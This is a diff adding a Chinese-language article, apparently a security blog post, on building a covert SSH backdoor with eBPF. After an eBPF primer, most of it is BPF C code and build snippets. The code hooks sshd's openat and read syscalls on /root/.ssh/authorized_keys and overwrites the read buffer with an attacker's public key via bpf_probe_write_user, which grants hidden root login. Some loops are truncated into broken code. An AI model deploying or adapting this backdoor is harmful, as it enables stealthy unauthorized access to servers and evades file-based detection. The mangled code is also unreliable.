@@ -1,0 +1,156 @@
+# 如何借助eBPF打造隐蔽的后门
+## eBPF技术简介
+linux内核本质上是内核驱动的，下图表现了这一过程：
+图片来自Cilium 项目的创始人和核心开发者在 2019 年的一个技术分享 [How to Make Linux Microservice-Aware
+with Cilium and eBPF](https://www.infoq.com/presentations/linux-cilium-ebpf)
+  * 在图中最上面，有进程进行系统调用，它们会连接到其他应用，写数据到磁盘，读写 socket，请求定时器等等。这些都是事件驱动的。这些过程都是系统调用。
+  * 在图最下面，是硬件层。这些可以是真实的硬件，也可以是虚拟的硬件，它们会处理中断事 件，例如：“嗨，我收到了一个网络包”，“嗨，你在这个设备上请求的数据现在可以读了”， 等等。可以说，内核所作的一切事情都是事件驱动的。
+  * 在图中间，是 12 million 行巨型单体应用（Linux Kernel）的代码，这些代码处理各种事件。
+### eBPF为什么会成为我们的好帮手呢？
+因为BPF 给我们提供了 **在这些事件发生时运行指定的eBPF程序** 的能力。
+eBPF
+程序并不像常规的线程那样，启动后就一直运行在那里，它需要事件触发后才会执行。这些事件包括系统调用、内核跟踪点、内核函数和用户态函数的调用退出、网络事件，等等。借助于强大的内核态插桩（kprobe）和用户态插桩（uprobe），eBPF
+程序几乎可以在内核和应用的任意位置进行插桩。
+例如，我们可以在以下事件发生时运行我们的 BPF 程序：
+  * 应用发起 `read`/`write`/`connect` 等系统调用
+  * TCP 发生重传
+  * 网络包达到网卡
+这很类似hook系统函数的行为，我们知道hook系统函数修改原有逻辑很容易会造成系统崩溃，那么 Linux 内核是如何实现 eBPF 程序的安全和稳定的呢？
+首先，ebpf程序并不是传统意义上的一个ELF执行程序，而是一段BPF字节码，这段字节码会交给内核的ebpf虚拟机。比如我们可以通过tcpdump
+生成一段对应过滤规则的字节码
+    > sudo tcpdump -i ens192 port 22 -ddd
+    24
+    40 0 0 12
+    21 0 8 34525
+    48 0 0 20
+    21 2 0 132
+    21 1 0 6
+    21 0 17 17
+    40 0 0 54
+    21 14 0 22
+    40 0 0 56
+    21 12 13 22
+    21 0 12 2048
+    48 0 0 23
+    21 2 0 132
+    21 1 0 6
+    21 0 8 17
+    40 0 0 20
+    69 6 0 8191
+    177 0 0 14
+    72 0 0 14
+    21 2 0 22
+    72 0 0 16
+    21 0 1 22
+    6 0 0 262144
+    6 0 0 0
+内核在接受 BPF 字节码之前，会首先通过验证器对字节码进行校验，只有校验通过的 BPF
+  1. 只有特权进程才可以执行 bpf 系统调用；
+  2. BPF 程序不能包含无限循环；
+  3. BPF 程序不能导致内核崩溃；
+  4. BPF 程序必须在有限时间内完成。
+  5. eBPF 程序不能随意调用内核函数，只能调用在 API 中定义的辅助函数；
+  6. BPF 程序可以利用 BPF 映射（map）进行存储，BPF 程序收集内核运行状态存储在映射中，用户程序再从映射中读出这些状态。eBPF 程序栈空间最多只有 512 字节，想要更大的存储，就必须要借助映射存储；
+安全校验后 eBPF 字节码将通过即时编译器（JIT，Just-In-Time
+Compiler）编译成为原生机器码，提供近乎内核本地代码的执行效率，并挂载到具体的 hook 点上。用户态程序与 eBPF 程序间通过常驻内存的 eBPF
+Map 结构进行双向通信，每当特定的事件发生时，eBPF 程序可以将采集的统计信息通过 Map
+结构传递给上层用户态的应用程序，进行进一步数据处理与分析。下图具体的展现了这一过程
+为了确保在内核中安全地执行，eBPF 还通过限制了能调用的指令集。这些指令集远不足以模拟完整的计算机。为了更高效地与内核进行交互，eBPF 指令有意采用了
+C 调用约定，其提供的辅助函数可以在 C 语言中直接调用，这也方便了我们开发eBPF程序，通常我们借助 LLVM 把编写的 eBPF 程序转换为 BPF
+字节码，然后再通过 bpf 系统调用提交给内核执行。
+下面，我们将通过实际开发来感受eBPF给安全人员提供的便利。
+## SSHD_BACKDOOR
+我们知道，当用户在连接到远程的ssh服务器并提供非对称密钥时，远程服务器sshd会打开对应用户目录下的 `~/.ssh/authorized_keys`
+验证用户是否可以通过对应的密钥登陆。
+因此，我们的目标很简单：就是让sshd打开`~/.ssh/authorized_keys` 读到的公钥文件夹中含有我们的公钥信息，这样我们就可以认证登陆了。
+其过程可以简化为如下C语言代码
+    char buf [4096] = {0x00};
+    int fd = open("/root/.ssh/authorized_keys", O_RDONLY);
+    if (fd  0) {
+        printf("%s", buf);
+    }
+    close(fd);
+    return 0;
+我们很容易可以想到，hook read函数，将获得的文件内容修改为含有我们公钥的的文件内容。
+    > sudo bpftrace -lv "tracepoint:syscalls:sys_enter_read"
+    tracepoint:syscalls:sys_enter_read
+        int __syscall_nr
+        unsigned int fd
+        char * buf
+        size_t count
+我们需要获得buf和count，即写入sshd读取缓存的地址，和对应的长度
+> 为什么不直接向fd写？  
+>  因为bpf只支持有限的函数调用，不能调用write向fd中写
+从这里我们也可以看出，如果只是hook这个函数，我们并不知道是哪个程序，打开了哪个文件调用的这个函数，为了进行过滤，我们还需要hook openat
+syscall
+    > sudo bpftrace -lv "tracepoint:syscalls:sys_enter_openat"
+    tracepoint:syscalls:sys_enter_openat
+        int __syscall_nr
+        int dfd
+        const char * filename
+        int flags
+        umode_t mode
+这里我们可以拿到filename,通过`/root/.ssh/authorized_keys` 这一打开文件名特征来进行过滤
+对应进程，可以通过bpf_helper自带的bpf_get_current_comm函数来获取对应的进程名，这里我们通过sshd进行过滤。
+总体来说，流程可以分为三步
+  1. hook openat syscall,根据文件名和进程名过滤拿到sshd的pid 和打开的 fd (通过exit时的ctx→ret)
+  2. hook read syscall 根据fd和pid过滤拿到sshd读取key的buf，并通过bpf_probe_write_user修改用户空间内存中的buf
+  3. hook exit syscal 清理ebpf map中保存的fd和pid，防止破坏其他进程和文件。
+### 具体实现
+Esonhugh 师傅基于cilium写了一版，为了锻炼自己写ebpf和rust的能力，拿libbpf-rs重写了一版，仓库在 编译后的程序大小可以达到只有几百k。
+bpf的部分是类似的,在enter时检查进程名参数中的文件名
+    SEC("tp/syscalls/sys_enter_openat")
+    int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
+    {
+        size_t pid_tgid = bpf_get_current_pid_tgid();
+        char comm[TASK_COMM_LEN];
+        if(bpf_get_current_comm(&comm, TASK_COMM_LEN)) {
+            return 0;
+        }
+        const int target_comm_len = 5;
+        const char *target_comm = "sshd";
+        for (int i = 0; i args[1]);
+        for (int i = 0; i ret;
+        bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);
+        return 0;
+    }
+在read enter时存储buff指针参数和大小
+    SEC("tracepoint/syscalls/sys_enter_read")
+    int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
+    {
+        size_t pid_tgid = bpf_get_current_pid_tgid();
+        unsigned int *pfd = (unsigned int *) bpf_map_lookup_elem(&map_fds, &pid_tgid);
+        if (pfd == 0) return 0;
+        unsigned int map_fd = *pfd;
+        unsigned int fd = (unsigned int)ctx->args[0];
+        if (map_fd != fd) return 0;
+        long unsigned int buff_addr = ctx->args[1];
+        size_t size = ctx->args[2];
+        struct syscall_read_logging data;
+        data.buffer_addr = buff_addr;
+        data.calling_size = size;
+        bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &data, BPF_ANY);
+        return 0;
+    }
+在read
+exit时根据存储的fd，和在enter时拿到的存储buff指针，修改对应的buff指针尾部MAX_PAYLOAD_LEN字节长的空间。（因此需要对应目标文件有那么多空间，否则无法写入，实战中可以向对应文件写入一些空格占位）
+    SEC("tracepoint/syscalls/sys_exit_read")
+    int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
+    {
+        ...
+        u8 key = 0;
+        struct custom_payload *payload = bpf_map_lookup_elem(&map_payload_buffer, &key);
+        u32 len = payload->payload_len;
+        long unsigned int new_buff_addr = buff_addr + read_size - MAX_PAYLOAD_LEN;
+        long ret = bpf_probe_write_user((void *)new_buff_addr, payload->raw_buf, MAX_PAYLOAD_LEN); 
+        ...
+        bpf_map_delete_elem(&map_fds, &pid_tgid);
+        bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);
+        return 0;
+    }
+#### 关于加载bpf程序
+    const SRC: &str = "src/bpf/backdoor.bpf.c";
+    let mut out =
+            PathBuf::from(env::var_os("OUT_DIR").expect("OUT_DIR must be set in build script"));
+        out.push("backdoor.skel.rs");
+        println!("cargo:rerun-if-changed=src/bpf");
